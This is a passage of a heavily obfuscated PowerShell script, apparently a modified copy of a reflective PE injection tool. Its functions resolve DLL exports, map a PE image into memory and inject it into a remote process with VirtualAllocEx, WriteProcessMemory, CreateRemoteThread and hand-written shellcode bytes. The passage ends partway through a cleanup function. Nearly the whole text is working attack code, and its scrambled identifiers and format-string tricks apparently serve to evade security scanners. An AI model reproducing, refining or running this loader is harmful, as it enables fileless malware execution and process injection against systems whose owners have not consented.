    Function CopY-aR`RAYoF`meMaDd`REs`seS
    {
        Param(  
        [Parameter(  POsItiOn =   0, MAnDAtORY  =  ${T`RuE} )]
        [Array[]]
        ${C`o`PyInfo},

        [Parameter(pOSitIon   =  1, MaNdaTORy = ${T`Rue})]
        [System.Object]
        ${Win`32f`U`NctionS},

        [Parameter(POsitIon   = 2, maNDAtoRy =  ${T`RUE})]
        [System.Object]
        ${wiN3`2CON`sT`AN`Ts}
        )

        [UInt32]${Old`pr`Ote`c`TfLAG}  =   0
        foreach (${i`Nfo} in ${CoP`Yinfo}  )
        {
            ${SU`C`CEsS}   =   ${w`i`N3`2`FUNctions}."vI`Rtu`ALp`Rot`eCT"."INVo`Ke"( ${I`NfO}[0], [UInt32]${I`Nfo}[2], [UInt32]${Wi`N`32co`NSTAnTs}."paGe_eX`e`C`UTE_rEa`dwRItE", [Ref]${o`LD`PRO`TeCTFLag})
            if (${sucC`e`ss} -eq ${F`AL`Se})
            {
                Throw "Modified: Call to VirtualProtect failed"
            }

            ${wI`N3`2FunctI`O`NS}."mEM`CpY"."INVo`Ke"( ${iN`Fo}[0], ${iN`FO}[1], [UInt64]${IN`FO}[2])  |   & ("{1}{0}" -f'll','Out-Nu'  )

            ${WI`N32FU`NC`TIonS}."vIRt`UALp`RO`TECt"."IN`Voke"(${I`Nfo}[0], [UInt32]${i`NfO}[2], [UInt32]${OLDp`RotEc`TFLAG}, [Ref]${O`lDpROTE`C`T`FLAg}  )   |   &("{0}{1}"-f'Ou','t-Null' )
        }
    }


   
   
   
    Function g`Et-MEmoR`YPrOC`ADDR`eSs
    {
        Param(
        [Parameter( pOsItIoN  = 0, MaNdaToRy =  ${tR`Ue})]
        [IntPtr]
        ${pEhAN`D`LE},

        [Parameter( poSitiOn   =   1, mAnDATory   = ${TR`Ue} )]
        [String]
        ${Fu`N`ctIOn`N`Ame}
         )

        ${WIN32t`y`p`eS}  =   &  ( "{2}{0}{1}" -f'yp','es','Get-Win32T'  )
        ${win`3`2cO`NSTa`NTS}   =   &  ( "{2}{4}{0}{1}{3}"-f'n','32C','Ge','onstants','t-Wi')
        ${pE`INFO}  =   & (  "{4}{1}{0}{2}{3}" -f'PE','et-','Det','ailedInfo','G' ) -PEHandle ${p`EHA`N`dLE} -Win32Types ${w`In3`2T`ypeS} -Win32Constants ${wIN`32COnSTa`Nts}

       
        if (  ${pEI`NFo}."IM`A`G`e`_NT_HeADErS"."opTiON`AlH`eAdEr"."eXPORT`Ta`B`le"."sI`Ze" -eq 0)
        {
            return   $wJAG7::"ze`RO"
        }
        ${eXpoR`T`TA`BlEp`Tr}   =    &  ( "{2}{1}{0}{4}{3}" -f 'edIntA','ign','Add-S','ned','sUnsig' ) (${PEHaNd`Le}) (${pe`IN`Fo}."Im`Ag`e_`Nt_`HEADERs"."OPtion`AlH`eaDeR"."Exp`or`T`TabLe"."vir`TUalAd`D`ReSS")
        ${Ex`po`RtTA`BLE}  =    (   DIr  ('v'  + 'AriABL' + 'E'+  ':aL9j' )).Value::"Pt`RtoST`R`UcTURE"(  ${EX`PO`Rt`TablEPTR}, [Type]${wIn`32T`YpeS}."IMA`G`e_`eXpORT_`diReC`TOry")

        for (  ${I} = 0; ${i} -lt ${EXPO`Rtt`ABLe}."N`UmBEr`O`FNAmeS" ;  ${I}++ )
        {
           
            ${N`AMe`OFfSe`TPTR}  =  & ( "{6}{1}{5}{0}{3}{4}{2}"-f 'gned','S','ned','IntAsU','nsig','i','Add-') (  ${PE`hAnD`le} ) ( ${e`xpor`TTABLe}."aDDRE`S`SO`F`NaMeS"   + (${i} *   (    itEM  (  'VA' +'RIa'+'ble' +  ':Al' +  '9j'  )  ).ValuE::"SIz`E`Of"(  [Type][UInt32] )) )
            ${name`Ptr} =    & ("{2}{0}{1}{3}{4}"-f'ed','In','Add-Sign','tAsU','nsigned') (${PEh`AN`dle} ) (  $Al9j::"p`TRTo`S`T`RuctuRE"(  ${naMEOFf`sET`P`TR}, [Type][UInt32] )  )
            ${na`ME}  =   (   get-VaRiABlE  al9j -Val  )::(  "{3}{2}{1}{0}"-f 'i','tringAns','S','PtrTo'  ).Invoke( ${NaMeP`TR})

            if ( ${n`Ame} -ceq ${FUnctI`o`NN`Ame}  )
            {
               
               
                ${O`Rdi`Nalp`TR}   =   & ("{3}{2}{6}{4}{1}{0}{5}"-f'si','Un','d','Ad','gnedIntAs','gned','-Si') ( ${p`eh`ANdlE} ) (  ${EXP`O`RTtaBle}."AD`D`RES`SoFNAmeO`RDi`NALS"   +   (  ${I} *  $AL9j::"SIZe`Of"( [Type][UInt16] ) ) )
                ${f`UnCInd`EX} =   (   get-CHildiTeM  variAblE:Al9J   ).VaLuE::"pTr`T`OstR`Uct`UrE"( ${O`RdI`NAlp`TR}, [Type][UInt16])
                ${F`U`NCof`Fs`ETAdDR}  = &("{0}{1}{3}{2}{4}" -f 'A','dd-','nedIntAsUn','Sig','signed' ) (${P`EhAN`DLE} ) ( ${E`x`PorTTaBLE}."Addr`ess`OF`FUnC`T`IOns" + ( ${FUNc`IN`DEx} *  $AL9j::"sI`zE`oF"(  [Type][UInt32]))  )
                ${fuNc`OFf`s`Et}   =    ( CHilditEm ( "VARI"+  "aBLe"  +  ":aL9J"  )   ).VAlue::"pt`Rto`StrU`CtUre"(  ${fUn`c`offSeTAD`DR}, [Type][UInt32] )
                return &("{2}{3}{0}{1}" -f'd-SignedIn','tAsUnsigned','A','d') ( ${p`EhAN`dLE}  ) (  ${fuNc`Offs`Et}  )
            }
        }

        return   (  lS  varIable:wJag7  ).vaLUE::"ZE`RO"
    }


    Function i`NvoKe`-m`eMo`RY`loADl`IbRarY
    {
        Param(  
        [Parameter(   poSITiOn =   0, manDAtORy =   ${tr`Ue}  )]
        [Byte[]]
        ${P`ebyTeS},

        [Parameter(POsiTiON  =   1, MANdATORy  =  ${f`ALse} )]
        [String]
        ${exE`A`RGs},

        [Parameter(  PoSitiOn  = 2, mANdatOry   =   ${FaL`Se} )]
        [IntPtr]
        ${ReMOt`ePRo`ChAnD`Le}
        )

        ${p`T`RsizE}   =   (   VARIabLe  (  "Al9"+ "j")  ).vaLuE::"sIz`EOf"(  [Type][IntPtr]  )

       
        ${W`iN32co`NsTAN`Ts}   =    & (  "{1}{0}{2}{3}{4}" -f 'Wi','Get-','n32Co','nst','ants'  )
        ${wIn`3`2`FUN`CtIonS}  = &  (  "{0}{1}{2}{3}"-f 'Get','-Win32','F','unctions'  )
        ${Win`32T`ypeS} =    & ( "{3}{1}{0}{2}"-f '3','t-Win','2Types','Ge')

        ${Remo`TE`lO`AdI`NG} =  ${f`AlSE}
        if (  (  ${R`EM`OTEPRoc`h`AND`Le} -ne ${Nu`Ll}) -and (  ${R`EmotE`p`RochAnDle} -ne   (  Gi  (  'va'  +  'RIABLe:WJA'+  'G'+  '7')  ).vAluE::"z`ErO"  )  )
        {
            ${Re`M`O`TeloaD`iNg}   =  ${tr`UE}
        }

       
        & (  "{2}{1}{0}"-f 'ose','Verb','Write-' ) "Modified: Getting basic PE information from the file"
        ${peI`NfO} =  & ( "{4}{3}{0}{2}{1}"-f 'EB','o','asicInf','P','Get-'  ) -PEBytes ${P`eBy`TES} -Win32Types ${wIn`32`TYP`es}
        ${OrIgINalim`A`G`Eb`ASe} =  ${P`e`infO}."ORigINalImA`ge`B`AsE"
        ${nx`CoM`P`ATIbLe}   =  ${T`RuE}
        if (( [Int] ${pEI`NFO}."dLlcH`ARac`TE`RiSTiCS" -band ${Wi`N3`2c`ONSTaNTS}."IMagE`_dLLcH`ArACTE`RI`sti`C`S`_NX`_`Co`MPat") -ne ${w`in3`2`C`oNsTANTs}."ImAge_dLL`C`HAra`CtERIST`iCs_`NX`_COMPaT"  )
        {
            & (  "{1}{4}{2}{3}{0}" -f 'rning','Wr','te-','Wa','i'  ) "Modified: PE is not compatible with DEP, might cause issues" -WarningAction ( "{0}{2}{1}"-f'Cont','nue','i')
            ${N`xCO`MPa`TiblE}   = ${F`Alse}
        }


       
        ${PRO`ce`s`s64bIt}   =  ${T`Rue}
        if ( ${r`EmOTe`LO`AD`iNg} -eq ${TR`Ue}  )
        {
            ${Ker`NEl32H`A`Nd`le}   =  ${WIn32f`UNct`i`O`NS}."gETmodUL`Eh`AndlE"."i`NVoKe"( "kernel32.dll"  )
            ${reSU`LT} =   ${Win3`2FU`NcTI`o`Ns}."Ge`TpROcAD`DResS"."in`VOKe"(${K`ERne`L32Ha`N`Dle}, "IsWow64Process")
            if ( ${rES`Ult} -eq   (   ls  ( 'vaR'  + 'i'+'aBlE:wja'  +  'G' +'7') ).VAlue::"Ze`RO"  )
            {
                Throw "Modified: Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }

            [Bool]${WO`W64pRo`cE`Ss} = ${fA`lse}
            ${S`UC`cEsS}  =  ${win32fu`N`cTio`Ns}."IS`W`ow64`pRoCEsS"."inv`oKe"(  ${REMoT`E`p`ROc`hA`NDLe}, [Ref]${wO`w64PROCe`sS})
            if (  ${s`U`cceSS} -eq ${Fa`l`SE} )
            {
                Throw "Modified: Call to IsWow64Process failed"
            }

            if ( (${wow6`4prO`C`e`SS} -eq ${tr`UE}  ) -or ( ( ${W`Ow64ProC`ESS} -eq ${fal`Se} ) -and ( $aL9J::"S`i`zEOf"(  [Type][IntPtr]  ) -eq 4))  )
            {
                ${PrOc`esS64`B`IT}   =  ${f`AlSe}
            }

           
            ${POwe`R`Sh`ELl6`4biT}  =  ${T`RuE}
            if (   (  GET-CHIlDITeM  vaRiABLe:al9j  ).VALUE::"Siz`EOF"(  [Type][IntPtr]  ) -ne 8 )
            {
                ${powERS`H`ELl6`4`BiT}  =   ${F`ALsE}
            }
            if ( ${POWERS`H`eLL64`BIT} -ne ${pRoceSs64`B`it}  )
            {
                Throw "Modified: PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if (   (    Get-VaRIAble  ( "a" +"L9J")  ).VALUe::"Si`z`Eof"([Type][IntPtr] ) -ne 8  )
            {
                ${P`ROC`ESS6`4BIt} =  ${fA`LsE}
            }
        }
        if (${p`Roc`E`SS64bit} -ne ${PEi`N`Fo}."P`e6`4BiT")
        {
            Throw "Modified: PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }


       
        & (  "{3}{0}{1}{2}"-f 'rite','-Verb','ose','W') "Modified: Allocating memory for the PE and write its headers to memory"

        [IntPtr]${LO`A`DAD`dr}   =   (GET-varIaBLe  ("W"+  "jAG7"  )  -VAlUE )::"Ze`Ro"
        if (  ([Int] ${P`e`INFO}."dLLChAract`e`R`Is`T`icS" -band ${wiN32`C`oNStanTs}."i`M`A`Ge_dLlcHA`R`ACtERIsTicS_`DynaMic_basE" ) -ne ${Wi`N32cO`NS`TA`NTs}."I`MagE_d`l`LcHaRa`c`TeRi`sT`I`cS_DynAMIC_`BASe")
        {
            & ("{2}{0}{1}" -f'rite-War','ning','W') "Modified: PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction ("{2}{1}{0}" -f'nue','ti','Con')
            [IntPtr]${lo`AdAdDR} =   ${orI`GI`N`ALImagEbasE}
        }

        ${p`eHA`NdlE} =  (   GI (  'VAriA' +  'bLE:' +'WjaG'+ '7'  )  ).VaLuE::"ZE`Ro"             
        ${Effec`TiVEP`E`HA`NDLe} =   ( gEt-ItEM  vaRIABLE:wjAG7  ).ValuE::"ze`Ro"    
        if (  ${R`E`Mo`TeLoAD`ing} -eq ${t`RuE})
        {
           
            ${PehA`N`dLE}   =   ${wIn32`FUNC`T`IOnS}."viRtual`All`oc"."i`NV`okE"(   ( ItEm VARiabLe:wJAG7   ).vAlUe::"Z`ErO", [UIntPtr]${Pei`Nfo}."SIZeOFI`M`Age", ${W`iN32`co`NS`TANTs}."Mem`_`COMmit" -bor ${Wi`N32co`NsTa`NtS}."ME`M_ReSe`RvE", ${w`iN32`coNst`A`Nts}."p`AGE_r`e`ADWri`Te" )

           
            ${EF`FECTiVE`p`eHaNDle}   = ${wIN32fuNc`TI`ONs}."virtUal`ALLO`cex"."INVO`ke"( ${Remo`TEPROCH`AN`D`LE}, ${l`oAdaDDR}, [UIntPtr]${PE`InFo}."sIzE`OFiMA`ge", ${Win32`c`onst`A`Nts}."M`em_cO`Mm`It" -bor ${WIn32Co`N`S`TAn`Ts}."MEM`_rEs`ErVE", ${wi`N32c`onS`Tan`TS}."PAge_e`XECut`e_R`eAdw`RI`Te")
            if (  ${EFFectI`VE`pEHAn`DLE} -eq   $wJaG7::"Z`eRo"  )
            {
                Throw "Modified: Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ( ${N`XcO`M`patiBLe} -eq ${T`RUe})
            {
                ${PehaNd`lE} =  ${wIN32`F`U`NCtIoNs}."Vi`RTu`A`LaLLOC"."Inv`oke"(${loa`dAd`Dr}, [UIntPtr]${peIN`FO}."sIzE`OFI`m`Age", ${w`iN32cONS`T`Ants}."MEM`_co`mMIt" -bor ${Win3`2cONS`TA`NtS}."meM_`RESe`RVe", ${WiN`32C`oNst`A`NTS}."paGE_r`EAdwr`iTe"  )
            }
            else
            {
                ${pEHA`NDle}  =   ${wIN32`FUNC`Ti`o`Ns}."Vir`TUA`laL`LOC"."iNV`OKe"(  ${lOADa`D`DR}, [UIntPtr]${p`einFO}."sIzEO`FIma`ge", ${Win32C`o`NST`A`NtS}."MeM_Co`m`Mit" -bor ${wiN`32c`ONSt`AnTs}."mEM_R`Es`erVE", ${WI`N32COn`StAN`Ts}."PagE_E`x`eCUTe`_R`EA`dW`RITe"  )
            }
            ${eFfec`TIvE`pE`HAndLE} =   ${PE`han`dLE}
        }

        [IntPtr]${pe`eNdaD`dR`ESs}   =   & ("{1}{5}{2}{6}{3}{4}{0}"-f 'signed','A','-','edIntA','sUn','dd','Sign' ) (${P`ehANd`lE} ) ([Int64]${p`eInfO}."s`Iz`EOFima`gE")
        if (  ${p`E`HAnDLE} -eq  (    Gi  (  "varI" +"AB"+"LE"  +  ":wJAG"+"7" )   ).ValuE::"ze`RO" )
        {
            Throw "Modified: VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
          (  gEt-variaBLE  Al9J -vAlUEoNl   )::("{1}{0}" -f'y','Cop').Invoke( ${p`ebyt`Es}, 0, ${P`EhaN`d`lE}, ${pE`in`FO}."SIze`OFH`eaD`ers")   |     &  (  "{0}{1}" -f 'Out-','Null')


       
         &  ( "{0}{1}{2}" -f'Wri','te-Ve','rbose'  ) "Modified: Getting detailed PE information from the headers loaded in memory"
        ${pei`NfO}   =    &  ("{1}{0}{2}{4}{3}"-f'et','G','-PEDetailedIn','o','f') -PEHandle ${P`EhANd`lE} -Win32Types ${win3`2T`ypES} -Win32Constants ${wI`N`32co`NStANTs}
        ${pe`I`NfO} |  & ("{2}{1}{0}{3}"-f 'Memb','d-','Ad','er') -MemberType ( "{0}{3}{1}{2}" -f'No','er','ty','teProp' ) -Name ("{2}{1}{0}{3}"-f 're','d','EndAd','ss' ) -Value ${P`Ee`Nda`DdRess}
        ${Pe`IN`Fo} |   & ( "{1}{0}{2}" -f 'Membe','Add-','r' ) -MemberType ("{1}{0}{3}{2}"-f'op','NotePr','y','ert') -Name (  "{0}{3}{1}{5}{2}{4}"-f 'Eff','c','Ha','e','ndle','tivePE') -Value ${EffeCT`IVe`P`ehaN`d`lE}
         &  (  "{0}{1}{3}{2}" -f'Write-','Ve','se','rbo' ) "Modified: StartAddress: $PEHandle    EndAddress: $PEEndAddress"


       
          &("{2}{0}{1}"-f'rite-Verbo','se','W'  ) "Modified: Copy PE sections in to memory"
        & ("{3}{0}{1}{2}"-f 'py','-S','ections','Co' ) -PEBytes ${p`EBYt`eS} -PEInfo ${pe`inFo} -Win32Functions ${wIn`32FunCt`io`NS} -Win32Types ${W`i`N32`TYpEs}


       
         &  ( "{1}{2}{0}{3}" -f'te-Verbos','W','ri','e' ) "Modified: Update memory addresses based on where the PE was actually loaded in memory"
        & (  "{4}{0}{3}{2}{1}"-f 'date-Me','sses','Addre','mory','Up') -PEInfo ${P`EI`NfO} -OriginalImageBase ${oRi`gi`N`ALiMageB`Ase} -Win32Constants ${wIn32c`O`Nst`AN`Ts} -Win32Types ${WI`N3`2T`Ypes}


       
        &  ("{1}{0}{2}{3}"-f 'i','Wr','te-Verbo','se' ) "Modified: Import DLL's needed by the PE we are loading"
        if ( ${reMOT`El`Oad`i`Ng} -eq ${Tr`Ue} )
        {
            &(  "{1}{3}{4}{0}{2}"-f 'r','I','ts','mport-DllI','mpo'  ) -PEInfo ${pEI`N`FO} -Win32Functions ${w`IN32fun`cTIo`Ns} -Win32Types ${wIN32`T`yP`eS} -Win32Constants ${wiN`3`2cOn`stanTS} -RemoteProcHandle ${REMotE`P`R`och`AND`lE}
        }
        else
        {
             & (  "{2}{3}{4}{0}{1}" -f'or','ts','Impo','rt-D','llImp' ) -PEInfo ${P`e`inFo} -Win32Functions ${w`In3`2f`UNc`Tions} -Win32Types ${WI`N32typ`Es} -Win32Constants ${wIn3`2COn`stANtS}
        }


       
        if ( ${R`eM`OTE`loaDINg} -eq ${f`AlSe})
        {
            if ( ${nx`coMpA`T`ible} -eq ${tr`Ue})
            {
                &  ( "{2}{1}{3}{0}"-f 'Verbose','te','Wri','-') "Modified: Update memory protection flags"
                &  ( "{6}{1}{4}{2}{5}{3}{0}" -f 's','ate-M','m','ctionFlag','e','oryProte','Upd'  ) -PEInfo ${Pei`NfO} -Win32Functions ${WIn32`F`UN`Ct`ions} -Win32Constants ${w`i`N`32cO`NsTaNTS} -Win32Types ${W`IN3`2types}
            }
            else
            {
                  & ("{3}{2}{1}{0}"-f'ose','erb','V','Write-' ) "Modified: PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
             &  ("{1}{0}{2}" -f 'te-Ver','Wri','bose' ) "Modified: PE being loaded in to a remote process, not adjusting memory permissions"
        }


       
        if (  ${R`EMoTeL`OA`DInG} -eq ${Tr`UE}  )
        {
            [UInt32]${Nu`mb`YTeSWR`ITT`En}   = 0
            ${s`U`CCeSS}   =   ${W`iN32f`UnCT`iO`NS}."WRI`TEp`Ro`CESsm`eMOrY"."iN`VoKE"( ${rE`Mot`EPROcH`AN`dLE}, ${E`FfEc`T`IVe`p`EHandLe}, ${p`e`h`ANdle}, [UIntPtr]( ${P`Ein`FO}."S`izEoF`ImaGE" ), [Ref]${NUMbY`TEs`WR`It`Ten} )
            if ( ${SUcC`ess} -eq ${fAL`Se} )
            {
                Throw "Modified: Unable to write shellcode to remote process memory."
            }
        }


       
        if ( ${p`E`InFo}."FiL`ETYPe" -ieq "DLL"  )
        {
            if (${reMOtEL`O`AdING} -eq ${f`AL`SE})
            {
                &  ("{2}{1}{0}"-f 'bose','e-Ver','Writ'  ) "Modified: Calling dllmain so the DLL knows it has been loaded"
                ${DlLMAin`p`Tr}   =     &  (  "{5}{2}{6}{3}{0}{4}{1}"-f'AsUn','ed','dd-Sign','t','sign','A','edIn' ) (  ${PEI`Nfo}."PeHANd`LE") ( ${p`e`iNfO}."iMagE_n`T_h`E`A`D`ERs"."OPt`ion`AL`heaD`er"."Add`Res`SoF`ent`RYPoI`NT"  )
                ${dLl`MAi`NdEL`eGaTE}  =  &  (  "{0}{1}{5}{2}{4}{3}" -f 'G','et-D','a','Type','te','eleg' ) @([IntPtr], [UInt32], [IntPtr] ) ( [Bool])
                ${d`ll`MAiN} =     $Al9J::("{5}{4}{3}{2}{1}{0}"-f 'nter','unctionPoi','F','eFor','legat','GetDe').Invoke( ${d`LL`m`AINptr}, ${dLlmai`N`DeLe`GA`Te}  )

                ${DL`L`MaIn}."inv`oke"( ${Pe`InFO}."p`Eh`AnDlE", 1,   $wjaG7::"zE`Ro" )  |    & ( "{0}{1}{2}" -f 'Ou','t-Nu','ll' )
            }
            else
            {
                ${dl`LMA`iNpTr}  = &( "{2}{1}{3}{0}" -f 'd','tAsUn','Add-SignedIn','signe') (${Ef`F`ecT`ivePeHAnDLe}  ) (${PeI`NfO}."iMAGe`_nT`_h`EADERs"."oP`Tion`A`lHe`ADEr"."AdDRe`s`S`OF`ENtRY`POint" )

                if (  ${Pe`I`NFo}."pE`64b`iT" -eq ${Tr`Ue} )
                {
                   
                    ${CaLld`L`lmainsC1}   =  @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9  )
                    ${CA`lLD`lLmAi`Ns`C2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    ${cal`ldL`lm`A`INSC3}  =   @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                   
                    ${callD`lLma`I`NSc1}  =  @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    ${C`ALLD`Llm`AinsC2} =  @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    ${ca`llD`lLMaiN`s`c3}   =   @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                ${sclE`N`gth}  = ${CA`lL`DlLMa`INS`c1}."lE`N`gTh" + ${Call`d`llMA`iNS`c2}."LE`N`gth"  +  ${c`ALlDl`Lm`AinsC3}."LEN`GtH"   +  (  ${PTr`Size} * 2)
                ${sc`P`Smem} =   $AL9J::( "{0}{2}{1}"-f'A','bal','llocHGlo').Invoke(  ${s`CLe`NGTH}  )
                ${SCpsM`e`MO`R`IgINal}   =   ${S`CpS`mem}

                &  ("{0}{5}{2}{4}{1}{3}"-f 'W','tesToM','-B','emory','y','rite'  ) -Bytes ${c`ALlDLlM`Ai`Nsc1} -MemoryAddress ${SC`PsMEM}
                ${SCp`smEM}  =   & (  "{2}{3}{1}{0}{4}" -f'ntA','SignedI','Ad','d-','sUnsigned') ${sc`Psm`EM} ( ${CA`ll`D`llmA`iNSC1}."Le`NGtH")
                  $AL9j::("{2}{0}{1}{3}" -f'ucture','ToP','Str','tr'  ).Invoke( ${ef`FECtiVe`PEH`AnDle}, ${ScPs`mEM}, ${F`A`lSe})
                ${s`cPsm`Em}   = & (  "{3}{5}{4}{0}{2}{1}{6}" -f 'igne','g','dIntAsUnsi','A','S','dd-','ned') ${SC`p`smEm} (${PTrS`iZe} )
                  & ( "{4}{2}{3}{1}{0}"-f'ory','em','s','ToM','Write-Byte' ) -Bytes ${c`A`LldlLm`AiN`sC2} -MemoryAddress ${S`cpSmem}
                ${S`CpSM`em}  =     &(  "{0}{2}{3}{4}{1}" -f'A','signed','dd-S','igne','dIntAsUn'  ) ${sc`PsM`eM} (  ${CalLdLLma`iNS`c2}."lEnG`TH" )
                 (  VaRiabLe  aL9j -Valueo  )::(  "{2}{0}{3}{1}"-f'ructu','r','St','reToPt').Invoke( ${DLLMAi`N`PTr}, ${Sc`p`SMEM}, ${F`Alse})
                ${S`cP`SMem}   =   &  ("{2}{3}{0}{1}" -f 'ntA','sUnsigned','Add-Sign','edI'  ) ${sC`p`SMem} (  ${PtrSI`ZE} )
                & ( "{4}{0}{1}{3}{2}" -f'tesT','oMem','ry','o','Write-By'  ) -Bytes ${CalL`DlLMain`SC3} -MemoryAddress ${S`Cp`SMeM}
                ${s`CpsM`eM} =   & ( "{4}{1}{5}{2}{6}{3}{0}" -f'gned','d','gne','si','Ad','-Si','dIntAsUn') ${scp`S`MEM} (${Cal`L`DL`LmaiNSC3}."l`ENg`TH"  )

                ${rScad`DR}  =  ${w`IN`32`FUNCtiO`Ns}."V`IRtuaL`AlL`ocEx"."I`NvOkE"( ${rE`mOtEPr`OC`Ha`NDLe},   (  GeT-iteM VARiABlE:WJag7 ).value::"Z`eRO", [UIntPtr][UInt64]${SClEn`G`TH}, ${WIn`32c`O`NSTAn`Ts}."MEm`_COm`mIT" -bor ${wi`N32co`NstaNts}."mE`m_RE`SErvE", ${win32C`OnS`TAn`Ts}."pAGe_`E`XECUTE_RE`Adw`RI`TE"  )
                if ( ${Rs`CA`DDR} -eq   $wJag7::"zE`Ro" )
                {
                    Throw "Modified: Unable to allocate memory in the remote process for shellcode"
                }

                ${SU`C`cesS}  = ${wI`N`32Fu`NCTiOns}."WRItEpR`Oc`E`SsMe`MorY"."InV`O`KE"(${REMotEP`Ro`ChAnd`Le}, ${rscAd`dr}, ${ScPSmEm`ORi`Gi`NaL}, [UIntPtr][UInt64]${SCl`engtH}, [Ref]${numBY`TeSwR`ItT`En} )
                if ((${SuC`c`esS} -eq ${F`Al`se} ) -or ( [UInt64]${n`UMb`Y`TESwRITten} -ne [UInt64]${SClE`N`g`TH}  )  )
                {
                    Throw "Modified: Unable to write shellcode to remote process memory."
                }

                ${RthReAD`h`A`N`dlE}  =    &  (  "{5}{0}{1}{3}{4}{2}"-f 'ke-C','r','oteThread','eateRe','m','Invo'  ) -ProcessHandle ${r`Em`oT`e`P`ROchaNdlE} -StartAddress ${rsc`A`ddR} -Win32Functions ${W`In32FuNCt`Io`Ns}
                ${R`Es`ULt}   =  ${WIn`32f`UNcTIoNS}."WAi`TFoRsi`NG`L`eo`BjEct"."Invo`Ke"( ${R`THreaDh`A`NdLe}, 20000)
                if ( ${R`e`SuLT} -ne 0 )
                {
                    Throw "Modified: Call to CreateRemoteThread to call GetProcAddress failed."
                }

                ${wIN`32fuNc`TIons}."V`IRt`UaL`FrEEEx"."InV`o`ke"( ${r`EmOTE`p`ROc`HAndlE}, ${R`sCAdDR}, [UIntPtr][UInt64]0, ${WIn3`2COns`TA`NtS}."MEm_`R`elEAsE"  )   |   &( "{0}{1}{2}"-f'Out-','Nu','ll')
            }
        }
        elseif (${pe`INFO}."filEtY`pE" -ieq "EXE"  )
        {
           
            [IntPtr]${exeDON`eb`y`TEpTr}   =    ( geT-chiLDItem VARIABlE:aL9j ).ValUE::( "{0}{2}{1}" -f'AllocHG','obal','l' ).Invoke(1)
              $aL9J::("{2}{0}{1}{3}"-f'it','e','Wr','Byte' ).Invoke( ${ExED`oNEbYteP`TR}, 0, 0x00  )
            ${oVERW`Ri`TTE`NmE`M`iNFo}  =    &("{0}{5}{3}{1}{4}{2}"-f'Up','-Ex','Functions','e','e','dat'  ) -PEInfo ${p`ei`Nfo} -Win32Functions ${wIN32f`UnCt`iONS} -Win32Constants ${WiN`32c`oNS`TanTs} -ExeArguments ${eXeA`R`Gs} -ExeDoneBytePtr ${EXEd`o`NEBYtEptr}

           
           
            [IntPtr]${eX`E`MAI`Nptr}   =   & (  "{3}{4}{0}{2}{1}{5}"-f 'igned','tAsUns','In','Add','-S','igned' ) (${p`einfO}."Peh`An`dLe" ) ( ${pe`in`Fo}."IMA`GE`_NT_`H`eaD`eRs"."Op`T`i`onALheader"."A`dDrEs`sOFentryPoI`NT" )
             & (  "{3}{1}{0}{2}" -f'o','ite-Verb','se','Wr'  ) "Modified: Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

            ${WIN3`2`FuNct`iONS}."CrEATEThR`e`AD"."INv`o`ke"(   $WJAG7::"z`ero",  (  Dir  VarIABle:WJaG7  ).valUe::"z`eRO", ${EXeM`A`iNP`TR},   $WjAG7::"ze`RO", ( [UInt32]0), [Ref]( [UInt32]0  ) )   | &("{2}{1}{0}"-f'ull','ut-N','O'  )

            while(${t`RUE} )
            {
                [Byte]${thrE`A`DD`OnE} =    $al9j::("{0}{2}{1}" -f 'Rea','te','dBy'  ).Invoke(  ${E`xE`DoNEByTEP`Tr}, 0)
                if (  ${Th`REad`DonE} -eq 1)
                {
                      &(  "{2}{0}{1}{4}{3}" -f 'Arr','ay','Copy-','ses','OfMemAddres') -CopyInfo ${O`VERwRiTTE`NM`em`INFO} -Win32Functions ${wi`N32fUNct`ioNs} -Win32Constants ${W`IN32cOnS`T`AntS}
                     &  (  "{2}{0}{1}{3}"-f 'Verb','o','Write-','se' ) "Modified: EXE thread has completed."
                    break
                }
                else
                {
                      &("{0}{3}{1}{2}" -f 'St','Sle','ep','art-'  ) -Seconds 1
                }
            }
        }

        return @(${pEI`N`Fo}."p`e`hanDLe", ${E`F`FECtive`peHA`NdlE}  )
    }


    Function I`N`VOK`e-meMoryFRE`ElIB`RA`RY
    {
        Param(  
        [Parameter(  PosITioN  = 0, maNDAToRY =  ${T`RuE})]
        [IntPtr]
        ${PEhA`NDlE}
         )

       
        ${W`iN`32coNSta`N`TS} = & ( "{3}{1}{0}{4}{2}" -f 'C','t-Win32','nts','Ge','onsta'  )
        ${wIN`32f`UNctio`Ns}  =   &  ("{3}{0}{1}{4}{5}{2}" -f '-Wi','n32','ctions','Get','Fu','n')
        ${Wi`N`32tY`PEs}   =   &  ("{2}{0}{1}"-f'e','s','Get-Win32Typ'  )

        ${p`e`iNFO} =    &  ("{0}{1}{2}{3}"-f'Ge','t-PEDetailed','I','nfo') -PEHandle ${P`eHaN`dLE} -Win32Types ${wI`N3`2`TyPES} -Win32Constants ${win`32`CONStANTS}

       
        if (${pEin`Fo}."iM`A`gE_Nt_H`eaDers"."OPTi`ON`AlHe`ADeR"."iM`po`RTT`ABLE"."s`IZe" -gt 0)
        {
